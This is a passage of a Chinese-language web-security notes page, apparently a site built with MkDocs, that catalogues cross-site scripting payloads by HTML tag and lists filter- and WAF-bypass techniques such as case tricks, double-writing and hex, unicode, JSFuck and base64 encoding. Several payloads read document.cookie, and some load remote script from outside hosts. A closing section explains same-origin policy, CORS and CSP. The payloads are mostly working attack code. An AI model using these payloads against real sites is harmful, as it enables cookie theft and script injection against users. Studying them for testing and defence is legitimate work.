+<pre><code>&lt;var onmouseover=&quot;prompt(1)&quot;&gt;M&lt;/var&gt;
+</code></pre>
+
+<p>8.div标签</p>
+<pre><code>&lt;div/onmouseover='alert(1)'&gt;X
+
+&lt;div style=&quot;position:absolute;top:0;left:0;width:100%;height:100%&quot; onclick=&quot;alert(52)&quot;&gt;
+</code></pre>
+
+<p>9.iframe标签</p>
+<p>有时候我们可以通过实体编码、换行和Tab字符来bypass。我们还可以通过事先在swf文件中插入我们的xss code，然后通过src属性来调用。不过关于flash，只有在crossdomain.xml文件中，allow-access-from domain=”*“允许从外部调用swf时，才可以通过flash来事先xss attack。</p>
+<p>下面的<code>&amp;Tab;</code>为tab字符</p>
+<pre><code>&lt;iframe  src=j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29&gt;&lt;/iframe&gt; 
+
+&lt;iframe SRC=&quot;http://0x.lv/xss.swf&quot;&gt;&lt;/iframe&gt; 
+
+&lt;IFRAME SRC=&quot;javascript:alert(1);&quot;&gt;&lt;/IFRAME&gt; 
+
+&lt;iframe/onload=alert(1)&gt;&lt;/iframe&gt;
+</code></pre>
+
+<p>10.meta标签</p>
+<p>测试时发现昵称，文章标题跑到meta标签中，那么只需要跳出当前属性再添加<code>http-equiv="refresh"</code>，就可以构造一个有效地xss payload。还有一些猥琐的思路，就是通过给<code>http-equiv</code>设置<code>set-cookie</code>，进一步重新设置cookie来干一些猥琐的事情。</p>
+<pre><code>  &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;javascript&amp;colon;alert(1)&quot;/&gt;
+
+  &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>object标签</li>
+</ul>
+</li>
+</ul>
+<p>和a标签的href属性的玩法是一样的，优点是无需交互。</p>
+<pre><code>&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=&gt;&lt;/object&gt;
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>marquee标签</li>
+</ul>
+</li>
+</ul>
+<pre><code>&lt;marquee onstart=&quot;alert('1')&quot;&gt;&lt;/marquee&gt;
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>isindex标签</li>
+</ul>
+</li>
+</ul>
+<p>在一些只针对属性做了过滤的webapp中，action很有可能是漏网之鱼。</p>
+<pre><code>&lt;isindex type=image src=1 onerror=alert(1)&gt; 
+
+&lt;isindex action=javascript:alert(1) type=image&gt;
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>input标签</li>
+</ul>
+</li>
+</ul>
+<p>通过event来调用js。和button一样通过autofocus可以达到无需交互即可弹窗的效果。</p>
+<pre><code>&lt;input onfocus=javascript:alert(1) autofocus&gt; 
+
+&lt;input onblur=javascript:alert(1) autofocus&gt;&lt;input autofocus&gt;
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>select标签</li>
+</ul>
+</li>
+</ul>
+<pre><code>&lt;select onfocus=javascript:alert(1) autofocus&gt;
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>textarea标签</li>
+</ul>
+</li>
+</ul>
+<pre><code>&lt;textarea onfocus=javascript:alert(1) autofocus&gt;
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>keygen标签</li>
+</ul>
+</li>
+</ul>
+<pre><code>&lt;keygen onfocus=javascript:alert(1) autofocus&gt;
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>frameset标签</li>
+</ul>
+</li>
+</ul>
+<pre><code>&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(1);&quot;&gt;&lt;/FRAMESET&gt; 
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>embed标签</li>
+</ul>
+</li>
+</ul>
+<pre><code>&lt;embed src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=&quot;&gt;&lt;/embed&gt; //chrome 
+
+&lt;embed src=javascript:alert(1)&gt; //firefox
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>svg标签</li>
+</ul>
+</li>
+</ul>
+<pre><code>&lt;svg onload=&quot;javascript:alert(1)&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;/svg&gt;
+
+&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;g onload=&quot;javascript:alert(1)&quot;&gt;&lt;/g&gt;&lt;/svg&gt;  //chrome有效
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>math标签</li>
+</ul>
+</li>
+</ul>
+<pre><code>&lt;math href=&quot;javascript:javascript:alert(1)&quot;&gt;CLICKME&lt;/math&gt; 
+
+&lt;math&gt;&lt;y/xlink:href=javascript:alert(51)&gt;test1 
+
+&lt;math&gt; &lt;maction actiontype=&quot;statusline#http://wangnima.com&quot; xlink:href=&quot;javascript:alert(49)&quot;&gt;CLICKME
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>video标签</li>
+</ul>
+</li>
+</ul>
+<pre><code>&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt; 
+
+&lt;video src=x onerror=alert(48)&gt;
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>audio标签</li>
+</ul>
+</li>
+</ul>
+<pre><code>&lt;audio src=x onerror=alert(47)&gt;
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>background属性</li>
+</ul>
+</li>
+</ul>
+<pre><code>&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; // 在Opera 10.5和IE6上有效
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>poster属性</li>
+</ul>
+</li>
+</ul>
+<pre><code>&lt;video poster=javascript:alert(1)//&gt;&lt;/video&gt; // Opera 10.5以下有效
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>code属性</li>
+</ul>
+</li>
+</ul>
+<pre><code>&lt;applet code=&quot;javascript:confirm(document.cookie);&quot;&gt; // Firefox有效
+embed code=&quot;http://businessinfo.co.uk/labs/xss/xss.swf&quot; allowscriptaccess=always&gt;
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>expression属性</li>
+</ul>
+</li>
+</ul>
+<pre><code>&lt;img style=&quot;xss:expression(alert(0))&quot;&gt; // IE7以下
+
+&lt;div style=&quot;color:rgb(''&amp;#0;x:expression(alert(1))&quot;&gt;&lt;/div&gt; // IE7以下
+
+&lt;style&gt;#test{x:expression(alert(/XSS/))}&lt;/style&gt; // IE7以下
+</code></pre>
+
+<h3 id="waf_1"><strong>过WAF技巧</strong></h3>
+<ul>
+<li>单次过滤规则绕过：有些规则仅进行一次过滤替换，可以通过双重复写绕过<code>&lt;scr&lt;script&gt;ipt&gt;</code></li>
+<li>大小写绕过：<code>&lt;sCript&gt;</code></li>
+<li>alert被过滤，可以尝试prompt和confirm</li>
+<li>没有引号和分号：<code>&lt;IMG SRC=javascript:alert('XSS')&gt;</code></li>
+<li>空格被过滤：<code>&lt;img/src=""onerror=alert(2)&gt; &lt;svg/onload=alert(2)&gt;&lt;/svg&gt;</code></li>
+<li>反引号妙用：</li>
+<li>长度限制时： <code>&lt;q/oncut=alert(1)&gt;//在限制长度的地方很有效</code></li>
+<li>单引号及双引号被过滤情况: <code>&lt;script&gt;alert(/jdq/)&lt;/script&gt; //用双引号会把引号内的内容单独作为内容 用斜杠，则会连斜杠一起回显</code></li>
+<li>javascript伪协议</li>
+</ul>
+<pre><code>&lt;a href=&quot;javascript:alert(/test/)&quot;&gt;xss&lt;/a&gt;
+&lt;iframe src=javascript:alert('xss');height=0 width=0 /&gt;&lt;iframe&gt;利用iframe框架标签
+</code></pre>
+
+<ul>
+<li>畸形payload：<code>&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;</code></li>
+<li>/的妙用：<code>&lt;script&gt;alert(/3/)&lt;/script&gt;</code></li>
+<li>括号被过滤,可以使用throw来抛出数据</li>
+</ul>
+<pre><code>&lt;a onmouseover=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;2&lt;/a&gt;
+
+&lt;img src=x onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;
+</code></pre>
+
+<p>以上两个测试向量在 Chrome 和 IE 上会出现一个 “uncaught” 错误，可以用下面的向量代替（下面向量在FireFox上测试失败）</p>
+<pre><code>&lt;body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29';&gt;
+</code></pre>
+
+<ul>
+<li>
+<p>当=();:被过滤时:<code>&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt;</code>opera 中可以不闭合 <code>&lt;svg&gt;&lt;script&gt;alert&amp;#40 1&amp;#41</code> // Opera可查</p>
+</li>
+<li>
+<p>过滤某些关键字（如：javascript） 可以在属性中的引号内容中使用空字符、空格、TAB换行、注释、特殊的函数，将代码行隔开。</p>
+</li>
+<li>比如在使用<code>&lt;iframe src="javascript:alert(1253)" height=0 width=0 /&gt;&lt;iframe&gt;</code>时，可以用回车、Tab键将src中的内容隔开，回车的url编码为%0a,%0b; </li>
+<li>
+<p>拼凑法：① 双写绕过；② 使用js定义变量z=scri, z+pt=script; ③ 两处输出点<code>&lt;scri&lt;!-- 第二处--&gt;pt&gt;</code>;</p>
+</li>
+<li>
+<p>无法使用href:</p>
+</li>
+</ul>
+<pre><code>&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;
+在chrome下，其回补全缺失的引号。因此，也可以这样写：
+&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;
+</code></pre>
+
+<ul>
+<li>解决限制字符(要求同页面)</li>
+</ul>
+<pre><code>&lt;script&gt;z=’document.’&lt;/script&gt; 
+&lt;script&gt;z=z+’write(“‘&lt;/script&gt; 
+&lt;script&gt;z=z+’&lt;script’&lt;/script&gt; 
+&lt;script&gt;z=z+’ src=ht’&lt;/script&gt; 
+&lt;script&gt;z=z+’tp://ww’&lt;/script&gt;
+&lt;script&gt;z=z+’w.shell’&lt;/script&gt; 
+&lt;script&gt;z=z+’.net/1.’&lt;/script&gt; 
+&lt;script&gt;z=z+’js&gt;&lt;/sc’&lt;/script&gt;
+&lt;script&gt;z=z+’ript&gt;”)’&lt;/script&gt; 
+&lt;script&gt;eval_r(z)&lt;/script&gt;
+</code></pre>
+
+<ul>
+<li>编码</li>
+</ul>
+<pre><code>JS函数（如eval，settimeout）还有就是href= action= formaction= location= on*= name= background= poster= src= code=这些地方，可以配合编码。此外，data属性可以base64编码。
+
+1.js16进制
+
+&lt;script&gt;eval(“js+16进制加密”)&lt;/script&gt; &lt;script&gt;eval(&quot;\x61\x6c\x65\x72\x74\x28\x22\x78\x73\x73\x22\x29&quot;)&lt;/script&gt; 编码要执行的语句↓
+Alert(“xss”)
+
+2.js unicode
+
+&lt;script&gt;eval(&quot;unicode加密&quot;)&lt;/script&gt; //js unicode加密 解决alert()被过滤
+&lt;script&gt;eval(&quot;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029&quot;)&lt;/script&gt;
+
+3.String.fromCharCode函数（不需要任何引号，必须函数内）
+
+&lt;script&gt;eval(String.fromCharCode编码内容))&lt;/script&gt; &lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,13))&lt;/script&gt;
+
+4.jsfuck版本
+
+&lt;script&gt;alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])&lt;/script&gt;
+
+5.HTML编码：
+
+&lt;img src='1' onerror='aler&amp;#x0074;(1)'&gt;
+
+6.base64编码（仅data支持）
+
+     &lt;object data=&quot;data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3QuY24vUnE5bjZ6dT48L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;
+     格式：
+     Data:&lt;mime type&gt;,&lt;encoded data&gt;
+     Data                //协议
+     &lt;mime type&gt;         //数据类型
+     charset=&lt;charset&gt;   //指定编码
+     [;base64]           //被指定的编码
+     &lt;encoded data&gt;      //定义data协议的编码
+     特点：不支持IE
+
+
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>存在json数据解析 context： <code>&lt;?=json_encode($_GET['x'])?&gt;</code> </li>
+</ul>
+</li>
+<li>
+<p>payload： <code>?x=&lt;img+src=x+onerror=ö-alert(1)&gt;</code></p>
+</li>
+<li>
+<ul>
+<li>SVG 标签</li>
+</ul>
+</li>
+</ul>
+<p>当返回结果在 svg 标签中的时候，会有一个特性 <code>&lt;svg&gt;&lt;script&gt;varmyvar="YourInput";&lt;/script&gt;&lt;/svg&gt;</code> YourInput 可控，输入 <code>www.site.com/test.php?var=text";alert(1)//</code> 如果把 “ 编码一些他仍然能够执行: <code>&lt;svg&gt;&lt;script&gt;varmyvar="text&amp;quot;;alert(1)//";&lt;/script&gt;&lt;/svg&gt;</code></p>
+<h2 id="corsjsonp">域、同源策略、CORS、JSONP</h2>
+<p><strong>1）同源策略</strong></p>
+<p>A网页设置的Cookie，B网页不能打开，除非这两个网页"同源"。所谓“同源”指的是“三个相同”：</p>
+<pre><code>•协议相同
+•域名相同
+•端口相同
+</code></pre>
+
+<p>如果非同源，共有三种行为受到限制。</p>
+<pre><code>（1）Cookie、LocalStorage和IndexDB无法读取。
+（2）DOM无法获得。
+（3）AJAX请求不能发送。（非CORS下）
+</code></pre>
+
+<p><strong>2）跨域请求</strong></p>
+<p>同源政策规定，AJAX请求只能发给同源的网址，否则就报错。除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制：</p>
+<pre><code>•JSONP:网页通过添加一个&lt;script&gt;元素，通过src属性向服务器请求JSON数据，这种做法不受同源策略限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来。
+•WebSocket：HTML5 开始提供的一种在单个 TCP 连接上进行全双工通讯的协议。
+•CORS：允许浏览器向跨源(协议 + 域名 + 端口)服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。
+•Flash URLLoader:【post+get】
+</code></pre>
+
+<p><strong>3）CSP</strong></p>
+<p>CSP全称为Content Security Policy，通过CSP所约束的的规责指定可信的内容来源（这里的内容可以指脚本、图片、iframe、font、style等等可能的远程的资源）。</p>
+<ul>
+<li><strong>参考</strong></li>
+</ul>
+<p>《XSS测试备忘录》<code>http://momomoxiaoxi.com/2017/10/10/XSS/</code></p>
+<p>（360安全客）深入理解浏览器解析机制和XSS向量编码</p>
+<p>WEBKIT中的HTML词法解析 <code>https://blog.csdn.net/dlmu2001/article/details/5998130</code></p>
+<h2 id="_3">技巧搜集</h2>
+<p><a href="https://xz.aliyun.com/t/3513">输入长度受限情况下的 XSS 攻击</a></p>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../08Variable_Coverage/" title="Variable Coverage" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                Variable Coverage
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../10CSRF/" title="CSRF" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                CSRF
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+        
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/application.5e60981f.js"></script>
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
+      
+    
+    
+      
+    
+  </body>
+</html>
